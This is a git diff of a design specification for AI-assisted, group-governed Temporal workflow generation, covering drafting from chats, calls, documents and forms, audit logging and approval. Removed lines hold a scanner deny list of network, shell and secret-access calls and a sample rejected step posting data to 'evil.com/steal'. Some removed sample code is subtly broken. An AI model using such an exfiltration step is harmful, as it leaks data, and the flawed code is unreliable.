@@ -1,4 +1,4 @@
-
+## 
 # AI-Assisted, Pathways-Aware Temporal Workflow Generation
 
 **Status: design · 2026-11-20 · meta-workflow specification.**
@@ -171,109 +171,573 @@ security:
 
 ---
 
-## 2. AI-Assisted Generation
+## 2. Multi-Party, Real-Time Generation
 
-The user describes the workflow in natural language. The AI assistant generates
-the YAML spec + TypeScript implementation + test cases.
+Workflows are not typed by one person at a terminal. They emerge from
+**collaborative work** — a group chat, a video call, a shared document, or a
+Plane task — and the AI assists in real time.
 
-### 2.1 Input: Natural language prompt
+### 2.1 Source: Group Chat (Matrix)
+
+In a Matrix room, a member says:
+
+> alice: "We need to automate the monthly membership renewal. Send a reminder,
+> wait 30 days, then mark them active or lapsed."
+
+The coop bot (Hermes) listens and replies with a draft spec:
 
 ```
-"We need a workflow that checks every month if members are up for renewal.
-If they are, send them a reminder. Wait 30 days. If they renew, mark them
-active. If not, mark them lapsed and tell the board. Don't let this run twice
-for the same month. If the member responds during the wait, the workflow
-should finish early."
+hermes-bot: Draft workflow spec from this conversation:
+  Name: annual-membership-renewal
+  Trigger: cron (1st of month)
+  Steps:
+    1. fetch-member
+    2. send-reminder (bus.publish membership.reminder)
+    3. sleep 30d
+    4. check-renewal
+    5. mark-active OR mark-lapsed + notify-board
+  Idempotency key: membership-renewal:{member_id}:{YYYY-MM}
+
+Reply with:
+  "@hermes lgtm" to freeze this draft
+  "@hermes add step ..." to extend it
+  "@hermes remove step 3" to cut it
 ```
 
-### 2.2 Output: Three artifacts
+Bob replies:
 
-1. **YAML spec** (the contract)
-2. **TypeScript workflow** (the implementation)
-3. **Test suite** (idempotency + contingency validation)
+> bob: "@hermes add step: if member responds during the wait, finish early."
 
-```typescript
-// workflows/generated/annual-membership-renewal.ts
-import { workflow, activity, sleep, condition } from "@temporalio/workflow";
-import type * as activities from "../activities/membership";
+Hermes updates the draft inline. The conversation *is* the requirements
+document. When three unique members reply with "@hermes lgtm", the draft is
+frozen and enters the validation pipeline.
 
-const { queryMember, updateMemberStatus, publishEvent } = workflow.proxyActivities<typeof activities>({
-  startToCloseTimeout: "1 minute",
-  retry: { maximumAttempts: 3, initialInterval: "10 seconds" },
-});
+**Audit artifact:** The frozen spec includes a `provenance` block:
 
-interface RenewalInput {
-  member_id: string;
-  renewal_window_days: number;
-}
-
-export async function annualMembershipRenewal(
-  input: RenewalInput
-): Promise<void> {
-  // Idempotency: Temporal workflowId is pre-hashed from the spec
-  // The caller sets: workflowId = `membership-renewal:${member_id}:${YYYY-MM}`
-
-  const member = await queryMember(input.member_id);
-
-  if (member.renewal_eligible) {
-    await publishEvent({
-      type: "membership.reminder",
-      payload: member,
-    });
-  }
-
-  // Wait for renewal or timeout
-  const renewalDeadline = Date.now() + input.renewal_window_days * 86400000;
-  const result = await Promise.race([
-    sleep(input.renewal_window_days + " days"),
-    workflow.condition(() => member.renewed_at !== null, input.renewal_window_days + " days"),
-  ]);
-
-  // Re-query to check state
-  const current = await queryMember(input.member_id);
-
-  if (current.renewed_at) {
-    await updateMemberStatus(input.member_id, "active");
-  } else {
-    await updateMemberStatus(input.member_id, "lapsed");
-    await publishEvent({
-      type: "membership.lapsed",
-      priority: "high",
-    });
-  }
-}
+```yaml
+provenance:
+  source_type: matrix_chat
+  room_id: "!abc123:matrix.irl.coop"
+  event_ids: ["$evt1", "$evt2", "$evt3", "$evt4"]
+  participants: ["@alice:irl.coop", "@bob:irl.coop", "@carol:irl.coop"]
+  frozen_at: "2026-11-20T15:30:00Z"
 ```
 
-### 2.3 AI generation constraints
-
-The AI is constrained by:
-- **Schema registry:** All `activity` names must exist in the registered activity catalog.
-- **RLS policies:** DB queries must reference tables the workflow's group has access to.
-- **Event bus schema:** All `bus.publish` events must match a known event type.
-- **No arbitrary code:** The AI cannot generate `fetch()`, `exec()`, or `eval()`.
+The Pathways run references these event IDs. Anyone can re-read the chat and
+see exactly who said what.
 
 ---
 
-## 3. Pathways Integration (Accountability)
+### 2.2 Source: Video Call (LiveKit)
 
-The workflow spec must be approved through a Pathways run before it is registered.
+During a group video call, the AI transcribes the conversation and extracts
+action items. The call moderator toggles on "workflow capture mode."
 
-### 3.1 Pathway template for workflow approval
+```
+[livekit-ai-transcript]
+
+Robbie (14:32): "We should have something that watches the soil sensors.
+If moisture drops below 20%, send an alert to the farm channel."
+
+Jessica (14:35): "And if it stays low for more than 2 hours, trigger the
+irrigation valve."
+
+Robbie (14:37): "Yes, but only if the valve was not already triggered in
+the last 6 hours."
+
+---
+
+Hermes captures this and posts to the call chat:
+
+Draft workflow: soil-moisture-irrigation
+  Trigger: sensor.reading (moisture < 20%)
+  Steps:
+    1. bus.publish alert to #farm
+    2. wait 2h
+    3. check valve-status (dedup: 6h window)
+    4. trigger valve if not recently triggered
+
+Participants: Robbie, Jessica
+Vote to freeze: [ ] Robbie [ ] Jessica
+```
+
+Both attendees click the checkbox in the call UI. The spec is frozen. The
+audio transcript is archived as the provenance record.
+
+**Audit artifact:**
 
 ```yaml
-# pathways/templates/approve-workflow.yaml
+provenance:
+  source_type: livekit_call
+  room: "detroit-soil-farm-call-2026-11-20"
+  transcript_hash: "sha256:abc..."
+  participants: ["robbie@detroit.coop", "jessica@detroit.coop"]
+  frozen_at: "2026-11-20T14:40:00Z"
+```
+
+---
+
+### 2.3 Source: Shared Document (NocoDB / Webstudio)
+
+A group collaboratively edits a spec document in ONLYOFFICE. The
+document has a special "workflow spec" block type that validates against the
+schema registry as people type.
+
+```
+[Shared doc: "Detroit Soil — Irrigation Automation"]
+
+Robbie edits:
+  trigger: sensor.reading < 20%
+
+Jessica edits:
+  steps:
+    - alert #farm
+    - wait 2h
+    - trigger valve (dedup 6h)
+
+The document shows:
+  [✓] Schema valid
+  [✓] Activities found in catalog
+  [⚠] No rollback defined for valve trigger
+
+Carol comments: "Add rollback: close valve if moisture recovers?"
+
+Jessica adds:
+  contingency:
+    rollback:
+      - activity: valve.close if sensor.reading > 40%
+```
+
+When all three participants click "Propose for Approval," the document state
+is snapshotted as the spec.
+
+**Audit artifact:**
+
+```yaml
+provenance:
+  source_type: shared_document
+  doc_id: "oo-doc-47/irrigation-spec"
+  version: 12
+  editors: ["robbie", "jessica", "carol"]
+  comments: ["c-1", "c-2", "c-3"]
+  frozen_at: "2026-11-20T16:15:00Z"
+```
+
+---
+
+
+
+### 2.4 Source: Form Submission (Formbricks / NocoDB Form / Web Form)
+
+A group publishes a form: "Propose a new workflow." Members fill in fields
+that map directly to the workflow spec schema.
+
+```
+[Form: "Propose a Workflow" — hosted at forms.detroit.irl.coop]
+
+Workflow name: ____________
+What triggers it? [ ] Cron  [ ] Event  [ ] Manual
+Describe the steps: (long text)
+What data does it need? (key-value pairs)
+What happens if it fails? (long text)
+How long should it wait? (duration)
+Who should be notified? (group roles)
+
+---
+
+Submission by: robbie@detroit.coop
+Submitted at: 2026-11-20 10:00 EST
+```
+
+The form backend (Formbricks or NocoDB) posts the submission to the workflow
+draft API. Hermes parses the free-text "Describe the steps" into structured
+YAML, then asks clarifying questions via reply email or Matrix DM.
+
+```
+hermes-bot: Draft from your form submission "Irrigation Alert":
+  Trigger: sensor.reading (moisture < threshold)
+  Steps:
+    1. alert #farm-channel
+    2. wait 2 hours
+  Clarifying questions:
+    - What is the moisture threshold? (you said "low" — is that 20%?)
+    - Should the workflow trigger more than once per day?
+    - What happens if the sensor goes offline?
+
+Reply to this message to refine the draft.
+```
+
+The form submitter (and any named co-authors) can reply to refine. When the
+submitter clicks "Looks good — freeze it" in the form response UI, the spec
+is frozen.
+
+**Form vs. Shared Doc distinction:**
+| | Shared Doc (ONLYOFFICE) | Form (Formbricks / NocoDB Form) |
+|---|---|---|
+| **Participants** | Multiple editors, real-time | Single submitter + named co-authors |
+| **AI role** | Drafts in real time as people type | Parses free-text after submission, asks async questions |
+| **Freeze** | All editors click "Propose" | Submitter confirms in form UI |
+| **Best for** | Complex, negotiated workflows | Structured, templated proposals |
+| **Audit** | Document version + comments | Form submission ID + reply thread |
+
+**Audit artifact:**
+
+```yaml
+provenance:
+  source_type: form_submission
+  form_id: "formbricks-detroit/workflow-proposal"
+  submission_id: "sub_abc123"
+  submitter: "robbie@detroit.coop"
+  co_authors: ["jessica@detroit.coop"]
+  clarifications: [2, 3, 5]  # form reply IDs
+  frozen_at: "2026-11-20T15:30:00Z"
+```
+
+### 2.5 Source: Plane Task
+
+A Plane task is created with the label `workflow-proposal`. The task
+description and comments become the spec source.
+
+```
+[Plane task #1847: "Auto-renew membership workflow"]
+
+Description (Robbie):
+  "When a member's renewal date approaches, send them a reminder email.
+  Wait 30 days. If renewed, mark active. If not, mark lapsed and notify
+  board."
+
+Comment (Jessica):
+  "What if they respond on day 5 with a question? We should finish the
+  workflow early if they renew."
+
+Comment (Robbie):
+  "Good catch. Add an early-exit condition."
+
+Comment (Carol):
+  "Also, don't send reminders to members who already renewed in the last
+  7 days. That's annoying."
+
+---
+
+Hermes watches Plane tasks with `workflow-proposal` label. When all assignees
+(marked as "approval required") add the comment "lgtm", the spec is assembled
+from the task + comments and frozen.
+
+**Audit artifact:**
+
+```yaml
+provenance:
+  source_type: plane_task
+  task_id: "detroit-soil/1847"
+  comments_included: [1, 2, 3, 4, 5]
+  approvers: ["robbie", "jessica", "carol"]
+  frozen_at: "2026-11-20T17:00:00Z"
+```
+
+---
+
+### 2.5 The Freeze Mechanism
+
+No matter the source, the spec is **frozen** when:
+
+| Source | Freeze trigger |
+|---|---|
+| Matrix chat | 3 unique members reply "@hermes lgtm" to the draft |
+| LiveKit call | All participants click "Approve draft" in call UI |
+| Shared doc (ONLYOFFICE) | All editors click "Propose for Approval" |
+| Form submission | Submitter confirms in form UI after AI clarification |
+| Plane task | All task assignees comment "lgtm" |
+| Any source + A2/A3 | Workflow is auto-frozen after a Pathways gate-profile check |
+
+Once frozen, the spec gets a `provenance` block and enters the validation
+pipeline. The original conversation/document/task remains visible and
+unchanged — it is the audit trail.
+
+---
+
+### 2.6 AI Generation from Conversation Context
+
+The AI does not just transcribe. It:
+
+1. **Extracts intent** from natural language: "send them a reminder" → `bus.publish membership.reminder`
+2. **Identifies gaps**: If no timeout is mentioned, asks "How long should we wait?"
+3. **Suggests idempotency**: "Should this run once per member per month? Yes → `membership-renewal:{id}:{YYYY-MM}`"
+4. **Proposes contingency**: "What if the member cancels during the wait?"
+5. **Validates against schema**: Rejects `activity: send_email` if no `send_email` activity exists in the catalog
+
+The AI is a **facilitator**, not an author. It drafts, questions, and validates.
+The humans decide.
+
+---
+
+
+### 2.6 Source: Dashboard Web UI (irl-coop Workflow Studio)
+
+The irl-dashboard includes a dedicated **Workflow Studio** surface—a visual,
+node-based workflow builder where group members can create, edit, preview,
+and manage workflows without leaving the browser.
+
+```
+[irl.coop dashboard → "Workflows" tab → "New Workflow"]
+
+┌──────────────────────────────────────────────────────────────┐
+│  Workflow Studio                              [Share] [Run]  │
+│                                                              │
+│  ┌──────────┐      ┌──────────┐      ┌──────────┐         │
+│  │  Trigger │─────▶│  Step 1  │─────▶│  Step 2  │         │
+│  │  (cron)  │      │ fetch    │      │ notify   │         │
+│  └──────────┘      │ member   │      │ board    │         │
+│                    └──────────┘      └──────────┘         │
+│                         │                                    │
+│                         ▼                                    │
+│                    ┌──────────┐                             │
+│                    │  Step 3  │                             │
+│                    │  wait    │                             │
+│                    │  30d     │                             │
+│                    └──────────┘                             │
+│                                                              │
+│  [+] Add step  [✓] Validate  [💾] Save draft  [🚀] Propose  │
+│                                                              │
+│  Collaborators: robbie ● jessica ○ carol ○                 │
+│  Group scope: detroit-soil (✓)  portland-water ( )          │
+└──────────────────────────────────────────────────────────────┘
+```
+
+#### Visual builder features
+
+| Feature | What it does |
+|---|---|
+| **Node palette** | Drag-and-drop activities from the catalog (db.query, bus.publish, sleep, conditional) |
+| **Schema validation live** | Red borders on invalid connections; green check when valid |
+| **Collaborative cursors** | Multiple group members edit the same workflow graph in real time (like Figma) |
+| **AI assist panel** | Side panel where members type natural language; AI suggests node additions |
+| **Group scope selector** | Choose which groups can trigger this workflow (default: creator group only) |
+| **Version diff** | Compare v1.2 vs v1.3 side by side before proposing |
+| **Test run** | Dry-run against sandbox data without registering to Temporal |
+| **History view** | See all past executions, which step failed, what data flowed through |
+| **Rollback trigger** | One-click "Rollback last execution" with confirmation Safe vote |
+| **Revoke** | One-click "Revoke workflow" — blocks all future triggers |
+
+#### Freeze from the dashboard
+
+When the workflow is ready, the creator clicks **"Propose for Approval."**
+This opens a side panel:
+
+```
+Propose "annual-membership-renewal" v1.0.0
+
+  [Review spec YAML] [Review generated TS] [View tests]
+
+  Required approvers (2 of 3 app-stewards):
+    [ ] Alice  [ ] Bob  [ ] Carol
+
+  [Cancel]                            [Send for Approval →]
+```
+
+The Pathways run starts automatically. As stewards vote, the dashboard shows
+real-time status: "Waiting for Alice and Bob." Once threshold is reached,
+the workflow is registered on-chain and deployed to Temporal.
+
+**Dashboard Web UI vs. other sources:**
+
+| | Dashboard Web UI | Matrix Chat | LiveKit Call | ONLYOFFICE Doc | Form | Plane Task |
+|---|---|---|---|---|---|---|
+| **Real-time collab** | Yes (cursors) | Yes (messages) | Yes (transcript) | Yes (editing) | No (async) | No (async) |
+| **Visual builder** | Yes (nodes) | No (text) | No (text) | No (text) | No (form fields) | No (text) |
+| **AI assist** | Side panel, live | Bot replies | Transcript extraction | Inline suggestions | Post-submission parsing | Comment parsing |
+| **Group scope** | Explicit selector | Implicit (room) | Implicit (call) | Implicit (doc share) | Form config | Implicit (project) |
+| **Best for** | Complex, visual workflows | Quick ideas | Meeting outcomes | Negotiated specs | Templated proposals | Task-driven work |
+| **Freeze trigger** | Creator clicks "Propose" | 3x lgtm | All approve | All editors propose | Submitter confirms | All assignees lgtm |
+
+**Audit artifact:**
+
+```yaml
+provenance:
+  source_type: dashboard_web_ui
+  session_id: "ws-20261120-abc123"
+  creator: "robbie@detroit.coop"
+  collaborators: ["jessica@detroit.coop"]  # real-time edits
+  group_scope: ["detroit-soil"]
+  frozen_at: "2026-11-20T18:00:00Z"
+  canvas_snapshot_cid: "QmCanvas..."  # screenshot or graph JSON at freeze time
+```
+
+## 3. Governance Model — Group-Local by Default, On-Chain for Federation
+
+The audit trail and governance settings for workflows are **group-local** by
+default. They live in Postgres under group RLS. On-chain records are used
+only when a workflow is meant to be shared, forked, or trusted across groups.
+
+### 3.1 Group Settings for Workflow Governance
+
+Every group configures its own workflow policy in `group_settings`:
+
+```sql
+CREATE TABLE group_settings (
+  group_id          uuid PRIMARY KEY REFERENCES groups(id),
+  workflow_policy   jsonb NOT NULL DEFAULT '{
+    "propose": ["member"],
+    "freeze_threshold": {"type": "count", "value": 2},
+    "approve": {"type": "safe", "safe_role": "workflow-custodians"},
+    "max_risk_tier": 2,
+    "require_idempotency_test": true,
+    "require_contingency_plan": true,
+    "on_chain_for": ["canonical", "cross_group"]
+  }'::jsonb
+);
+```
+
+**Policy fields:**
+
+| Field | Meaning | Example values |
+|---|---|---|
+| `propose` | Who can propose a workflow | `"member"`, `"steward"`, `"role:organiser"` |
+| `freeze_threshold` | How many approvals to freeze a draft | `count: 2`, `count: 3`, `majority` |
+| `approve` | Who gives final approval | `safe: "workflow-custodians"`, `threshold: 3`, `any_admin` |
+| `max_risk_tier` | Highest allowed risk tier without escalation | `1`, `2`, or `3` |
+| `require_idempotency_test` | Must pass simulation before approval | `true` / `false` |
+| `require_contingency_plan` | Must define rollback/fallback | `true` / `false` |
+| `on_chain_for` | Which workflow types go on-chain | `["canonical"]`, `["canonical", "cross_group"]`, `[]` |
+
+A small mutual-aid group might set: any two members can freeze, one admin
+approves, nothing goes on-chain. A federation hub might set: stewards freeze,
+Safe threshold approves, canonical workflows go on-chain.
+
+**RLS enforcement:**
+
+```sql
+CREATE POLICY group_settings_read ON group_settings
+FOR SELECT USING (group_id = coop_current_group());
+
+CREATE POLICY group_settings_write ON group_settings
+FOR UPDATE USING (
+  group_id = coop_current_group()
+  AND coop_current_safe_role() IN ('admin', 'governance')
+);
+```
+
+Only members of the group can read or change its workflow policy.
+
+---
+
+### 3.2 Audit Trail in Postgres (Group-Local)
+
+Every workflow action is recorded in the group-local audit trail. This is the
+**primary source of truth** for day-to-day governance.
+
+```sql
+CREATE TABLE workflow_audit_log (
+  id              uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+  group_id        uuid NOT NULL REFERENCES groups(id),
+  workflow_name   text NOT NULL,
+  workflow_version text NOT NULL,
+  event_type      text CHECK (event_type IN (
+    'draft_created', 'draft_frozen', 'validation_passed', 'validation_failed',
+    'approval_requested', 'approval_granted', 'approval_denied', 'revoked',
+    'deployed', 'execution_started', 'execution_completed', 'execution_failed',
+    'rollback_triggered', 'forked_from'
+  )),
+  actor_id        uuid REFERENCES users(id),      -- who did it
+  actor_safe      text,                            -- Safe role if applicable
+  payload         jsonb,                           -- event details
+  provenance      jsonb,                           -- conversation/doc/call artifact
+  created_at      timestamptz DEFAULT now(),
+  UNIQUE (group_id, workflow_name, workflow_version, event_type, created_at)
+);
+
+-- RLS: members can only see their own group's audit log
+CREATE POLICY workflow_audit_read ON workflow_audit_log
+FOR SELECT USING (group_id = coop_current_group());
+
+-- RLS: only system processes and approved actors can write
+CREATE POLICY workflow_audit_write ON workflow_audit_log
+FOR INSERT WITH CHECK (group_id = coop_current_group());
+```
+
+**What gets logged:**
+
+| Event | Payload includes | Provenance includes |
+|---|---|---|
+| `draft_created` | spec YAML, AI prompt | source_type, creator |
+| `draft_frozen` | frozen spec hash | event_ids, transcript_hash, doc_version, task_comments |
+| `validation_passed` | validator reports | CI run IDs |
+| `approval_granted` | voter address, signature | Pathways run ID |
+| `deployed` | Temporal namespace, task queue | deployment artifact hash |
+| `execution_failed` | error message, step number | execution trace |
+| `rollback_triggered` | rollback steps executed | compensation results |
+
+**The audit log is append-only.** There is no UPDATE or DELETE policy. If a
+workflow is revoked, a `revoked` event is appended. The full history is always
+recoverable.
+
+---
+
+### 3.3 On-Chain Record (Optional, for Federation)
+
+On-chain registration is **not the default**. It is used only when:
+
+1. **Canonical blessing:** The app-stewards subgroup blesses a workflow as
+   part of the canonical set (like a canonical app).
+2. **Cross-group trust:** A workflow created by Group A is meant to be
+   auditable and forkable by Group B without Group B having to trust Group A's
+   Postgres server.
+3. **Revocation broadcast:** A revoked canonical workflow must be blocked
+   network-wide, not just in one group's Postgres.
+
+```solidity
+// CoopRegistry.sol — OPTIONAL entries for cross-group workflows
+struct WorkflowRegistration {
+    bytes20 groupId;           // which group owns this workflow
+    bytes20 gitCommit;
+    bytes20 approvedBy;        // group Safe or app-stewards Safe
+    bytes32 specHash;          // keccak256(yaml spec content)
+    bytes32 auditRoot;         // Merkle root of Postgres audit log
+    uint8 riskTier;
+    uint256 approvedAt;
+    bool revoked;
+    bool canonical;            // true = blessed by app-stewards
+}
+mapping(string => WorkflowRegistration) public workflows;
+```
+
+**Key differences from earlier drafts:**
+
+| | OLD model | NEW model |
+|---|---|---|
+| Default | Everything on-chain | Group-local Postgres by default |
+| Governance | Global app-stewards Safe | Each group's own policy |
+| Audit trail | IPFS provenanceCID only | Postgres append-only log + optional on-chain Merkle root |
+| Cross-group trust | Assumed | Explicit opt-in per workflow |
+| Revocation | On-chain transaction | Group-local `revoked` event in audit log; on-chain only for canonical |
+
+**The Merkle root (`auditRoot`):** Instead of pinning the entire conversation
+to IPFS, the group computes a Merkle root of its Postgres audit log entries
+for that workflow and anchors it on-chain. Other groups can request the full
+audit log, verify the Merkle root, and trust the history without trusting the
+hosting group.
+
+---
+
+### 3.4 Pathways Integration (Group-Local Accountability)
+
+The Pathways run for workflow approval is scoped to the **group**, not the
+global app-stewards.
+
+```yaml
+# pathways/templates/approve-workflow.yaml (group-local variant)
 name: approve-workflow
 version: 1.0.0
 autonomy: A2
+# Gate profile is READ from the group's own policy
 gate_profile:
-  require_security_review: true
-  require_idempotency_test: true
-  max_risk_tier: 2
-triggers:
-  - type: pr
-    repo: irl-coop-stack-v2
-    path: workflows/proposals/**
+  source: group_settings.workflow_policy
 steps:
+  - name: verify-provenance
+    executor: provenance-checker
+    script: |
+      assert spec.provenance.participants >= group_settings.workflow_policy.freeze_threshold.value
+      assert spec.provenance.frozen_at is not null
+
   - name: lint-spec
     executor: ci-runner
     script: make lint-workflow-spec SPEC=$spec_path
@@ -282,335 +746,254 @@ steps:
     executor: workflow-security-scanner
     script: scan-workflow-spec $spec_path
     outputs:
-      - external_api_calls
-      - db_permissions
-      - secrets_access
       - risk_score
 
   - name: schema-validation
     executor: schema-validator
     script: validate-workflow-schema $spec_path
-    outputs:
-      - input_schema_valid
-      - event_types_valid
-      - activity_catalog_valid
 
   - name: idempotency-simulation
     executor: temporal-test-runner
     script: make test-workflow-idempotency SPEC=$spec_path
-    outputs:
-      - double_trigger_safe
-      - collision_behavior_verified
 
   - name: contingency-check
     executor: static-analyzer
     script: make check-contingency SPEC=$spec_path
-    outputs:
-      - rollback_defined
-      - timeout_handler_present
-      - fallback_action_present
 
-  - name: steward-review
+  - name: group-approval
     executor: safe-vote
     config:
-      safe_address: app-stewards.safe.irl.coop
-      threshold: 2
-      proposal: "Approve workflow ${{spec.name}} v${{spec.version}}"
+      # The Safe address comes from the group's own workflow-custodians Safe
+      safe_address: "${{group_settings.workflow_policy.approve.safe_role}}"
+      threshold: 2  # or read from Safe's actual threshold
+      proposal: |
+        Approve workflow ${{spec.name}} v${{spec.version}}
+        Group: ${{group_id}}
+        Risk tier: ${{security_scan.risk_score}}
+        Audit log: workflow_audit_log/${{group_id}}/${{spec.name}}/${{spec.version}}
 
-  - name: register-on-chain
+  - name: write-audit-record
+    executor: db-insert
+    script: |
+      INSERT INTO workflow_audit_log (group_id, workflow_name, workflow_version,
+        event_type, actor_safe, payload, provenance)
+      VALUES (${{group_id}}, ${{spec.name}}, ${{spec.version}},
+        'approval_granted', 'workflow-custodians', ${{approval_payload}}, ${{spec.provenance}});
+
+  - name: optional-on-chain-anchor
     executor: base-transaction
+    condition: |
+      group_settings.workflow_policy.on_chain_for.includes(spec.classification)
     script: |
       CoopRegistry.registerWorkflow(
+        groupId=group_id,
         name=spec.name,
         version=spec.version,
-        gitCommit=git_commit,
-        riskTier=security_scan.risk_score,
-        approvedBy=app_stewards_safe
+        specHash=keccak256(yaml_content),
+        auditRoot=merkle_root(workflow_audit_log, group_id, spec.name, spec.version)
       )
 
   - name: register-with-temporal
     executor: temporal-cli
-    script: temporal workflow register --spec $spec_path
+    script: temporal workflow register --spec $spec_path --group ${{group_id}}
 ```
 
-### 3.2 On-chain registration
-
-```solidity
-// CoopRegistry.sol
-struct WorkflowRegistration {
-    bytes20 gitCommit;
-    bytes20 approvedBy;
-    bytes32 specHash;        // keccak256(yaml spec content)
-    uint8 riskTier;          // 1=low, 2=medium, 3=high
-    uint256 approvedAt;
-    bool revoked;
-}
-mapping(string => WorkflowRegistration) public workflows;
-```
-
-The `specHash` means: if the YAML spec changes even one byte, the on-chain
-registration is invalidated. The workflow must be re-approved.
-
-### 3.3 HandoffEnvelope for workflow execution
-
-When a workflow is triggered, the event bus wraps the trigger in a Pathways
-`HandoffEnvelope`:
-
-```json
-{
-  "handoff_type": "temporal_workflow_trigger",
-  "workflow_name": "annual-membership-renewal",
-  "workflow_version": "2.1.0",
-  "workflow_id": "membership-renewal:abc-123:2026-11",
-  "trigger": {
-    "type": "cron",
-    "timestamp": "2026-11-01T00:00:00Z"
-  },
-  "inputs": {
-    "member_id": "abc-123",
-    "renewal_window_days": 30
-  },
-  "safe_signature": "0x...",
-  "pathway_run": "pr_0x9a4b..."
-}
-```
-
-The Temporal worker verifies:
-1. The workflow is registered in `CoopRegistry` (not revoked)
-2. The `specHash` matches the deployed implementation
-3. The `safe_signature` is valid for the triggering group
+**Note:** The `optional-on-chain-anchor` step only runs if the group policy
+says so. Most groups will skip this entirely.
 
 ---
 
-## 4. The Four Validation Dimensions
+### 3.5 The Provenance Record (Group-Local, Not IPFS)
 
-### 4.1 Security Validation
-
-**Static scanner checks:**
-
-| Check | Method | Fail action |
-|---|---|---|
-| No arbitrary external APIs | AST parse — deny `fetch`, `axios`, `request` | Reject spec |
-| DB permissions match RLS | Compare query tables against `security.db_permissions` | Flag for review |
-| No secret exfiltration | Deny `process.env.*` in workflow code | Reject spec |
-| Event types are allowlisted | Match `bus.publish` types against registry | Reject spec |
-| Max execution time enforced | Check `security.max_execution_time` <= group policy | Cap or reject |
-| No privileged activities | Deny `activity: shell.exec`, `activity: fs.write` | Reject spec |
-
-**Example failure:**
-```yaml
-steps:
-  - name: exfil
-    activity: http.post        ← REJECTED: external_api_calls is empty but http.post is used
-    url: "https://evil.com/steal"
-```
-
-### 4.2 Versioning
-
-**Three-layer versioning:**
-
-| Layer | Mechanism |
-|---|---|
-| **Spec version** | Semantic version in YAML (`version: 2.1.0`) |
-| **Git version** | `gitCommit` in `CoopRegistry` registration |
-| **Temporal task queue** | Workflows deployed to `group-{group_id}-v{major}` queue |
-
-**Breaking change detection:**
-- If input schema changes, a new major version is required.
-- If event types change, all downstream consumers must be re-validated.
-- The generator compares the new spec against the previous registered version
-  and flags breaking changes.
-
-**Example:**
-```yaml
-# v1.0.0
-inputs:
-  - name: member_id
-    type: uuid
-
-# v2.0.0 (breaking change)
-inputs:
-  - name: member_id
-    type: uuid
-  - name: renewal_window_days    ← NEW required input
-    type: int
-```
-
-The validator flags: "Breaking change: new required input `renewal_window_days`.
-Major version bump required. All callers must be updated."
-
-### 4.3 Idempotency
-
-**Idempotency is not optional.** Every workflow must declare an idempotency key.
+The provenance of a workflow draft is stored in the Postgres audit log, not
+pinned to IPFS by default.
 
 ```yaml
-idempotency:
-  key: "membership-renewal:${{inputs.member_id}}:${{trigger.timestamp | date('YYYY-MM')}}"
-  scope: group
-  collision: abort
+# Stored in workflow_audit_log.provenance as JSONB
+provenance:
+  source_type: matrix_chat
+  room_id: "!abc123:matrix.irl.coop"
+  event_ids: ["$evt1", "$evt2", "$evt3", "$evt4"]
+  participants: ["@alice:irl.coop", "@bob:irl.coop", "@carol:irl.coop"]
+  frozen_at: "2026-11-20T15:30:00Z"
+  # The actual Matrix events are fetched from the group's Matrix server
+  # (not from IPFS). Other groups can request them via federation gateway.
 ```
 
-**Validation tests:**
+**For cross-group verification:** If another group wants to audit this
+workflow's history, they request the audit log from the source group via the
+federation gateway. The source group returns the log entries + a Merkle proof
+that they hash to the on-chain `auditRoot` (if anchored). No IPFS needed for
+the common case.
 
-| Test | What it checks |
-|---|---|
-| Double trigger | Same inputs, same idempotency key — second run must abort/skip |
-| Race condition | Two workers receive the same trigger simultaneously — one wins |
-| Partial execution | Worker crashes after step 3 — restart must not re-run steps 1-3 |
-| Input variation | Same logical work, different input formatting — key must normalize |
-
-**Temporal-native idempotency:**
-```typescript
-// The workflowId is set to the idempotency key BEFORE execution
-const workflowId = `membership-renewal:${member_id}:${yearMonth}`;
-await client.start(annualMembershipRenewal, {
-  workflowId,
-  taskQueue: "detroit-soil-v2",
-  args: [input],
-});
-```
-
-If a workflow with the same `workflowId` already exists, Temporal returns
-`WorkflowExecutionAlreadyStartedError`. The caller handles this based on
-collision policy (`abort`, `skip`, or `overwrite`).
-
-### 4.4 Contingency Plans
-
-**Every workflow must define:**
+**IPFS is still available as an opt-in backup.** A group can configure:
 
 ```yaml
-contingency:
-  on_failure:
-    - notify: "slack://#ops-alerts"
-    - log_level: error
-    - create_issue: true
-  on_timeout:
-    - escalate_to: board
-    - fallback_action: { activity: bus.publish, event: { type: escalation.timeout } }
-  rollback:
-    enabled: true
-    max_rollback_steps: 3
+# group_settings.workflow_policy
+backup_provenance_to_ipfs: true
 ```
 
-**Contingency validator checks:**
-
-| Check | Required? |
-|---|---|
-| `on_failure` handler defined | Yes |
-| `on_timeout` handler defined | If workflow has `sleep` or `wait` |
-| `rollback.enabled` is `true` for write operations | Strongly recommended |
-| Fallback action does not depend on the failed step | Yes |
-| Rollback activities are idempotent | Yes |
-
-**Example: rollback after payment failure**
-
-```yaml
-steps:
-  - name: debit-safe
-    activity: safe.debit
-    amount: "${{inputs.amount}}"
-    output: debit_tx
-
-  - name: send-to-funder
-    activity: rail.transfer
-    amount: "${{inputs.amount}}"
-    tx_ref: "${{steps.debit-safe.output.tx_hash}}"
-    retry_policy:
-      max_attempts: 3
-    on_failure:
-      rollback:
-        - activity: safe.credit
-          amount: "${{inputs.amount}}"
-          tx_ref: "${{steps.debit-safe.output.tx_hash}}"
-      notify: "slack://#finance-ops"
-```
-
-**Temporal sagas for rollback:**
-```typescript
-// Saga compensations are registered before the action
-const saga = new Saga();
-
-saga.addCompensation(safeCredit, {
-  amount: input.amount,
-  txRef: debitTx.txHash,
-});
-
-const debitTx = await safeDebit(input.amount);
-
-saga.addCompensation(railReverse, {
-  txRef: debitTx.txHash,
-});
-
-try {
-  await railTransfer(debitTx.txHash, input.amount);
-} catch (err) {
-  await saga.compensate();  // Automatically runs compensations in reverse order
-  throw err;
-}
-```
+This pins the provenance artifact to IPFS for redundancy, but the primary
+source of truth remains the group-local Postgres + optional on-chain Merkle
+root.
 
 ---
 
-## 5. The Complete Lifecycle
+---
 
-| Stage | Actor | Action | Output |
-|---|---|---|---|
-| 1. Describe | Group member | Writes natural language prompt | Prompt text |
-| 2. Generate | AI assistant | Generates YAML + TS + tests | Three artifacts |
-| 3. Validate automated | CI pipeline | Static security, schema, idempotency, contingency | Pass/fail report |
-| 4. Review | app-stewards Safe | Pathways run with threshold vote | Approval signature |
-| 5. Register on-chain | executor | `CoopRegistry.registerWorkflow()` | `specHash` committed |
-| 6. Register in Temporal | executor | `temporal workflow register` | Task queue updated |
-| 7. Trigger | Event bus / cron | `HandoffEnvelope` sent to Temporal worker | Workflow execution |
